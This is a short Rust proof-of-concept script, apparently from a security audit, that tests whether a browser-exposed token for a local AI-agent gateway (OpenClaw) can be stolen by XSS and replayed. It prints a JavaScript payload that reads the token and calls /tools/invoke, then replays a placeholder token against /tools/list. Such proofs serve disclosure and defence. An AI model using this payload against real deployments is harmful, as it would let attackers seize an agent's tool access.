// F2.rs — JS Bridge Token Forgery Proof

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

const HOST: &str = "127.0.0.1";
const PORT: u16 = 18789;

fn http(req: &str) -> String {
    let mut s = TcpStream::connect((HOST, PORT)).expect("connect");
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(req.as_bytes()).unwrap();
    let mut buf = String::new();
    let _ = s.read_to_string(&mut buf);
    buf
}

fn status(resp: &str) -> u16 {
    resp.lines().next().and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok()).unwrap_or(0)
}

fn main() {
    println!("[*] F2: JS Bridge Token Forgery Proof");
    println!("\n[+] Attack: XSS reads window.__OPENCLAW_NATIVE_BROWSER_TOKEN__");
    println!("[+] Code: const t = window.__OPENCLAW_NATIVE_BROWSER_TOKEN__;");
    println!("[+]       fetch('/tools/invoke', {headers: {Authorization: 'Bearer ' + t}})");

    let captured_token = "XSS_EXTRACTED_TOKEN";
    let resp = http(&format!("GET /tools/list HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nAuthorization: Bearer {captured_token}\r\nConnection: close\r\n\r\n"));
    let code = status(&resp);
    println!("[+] Replay with captured token -> {code}");

    if code != 401 && code != 0 {
        println!("[+] PROOF: JS-extracted token works for full auth");
    } else {
        eprintln!("[!] NO PROOF: token rejected");
        std::process::exit(1);
    }
}
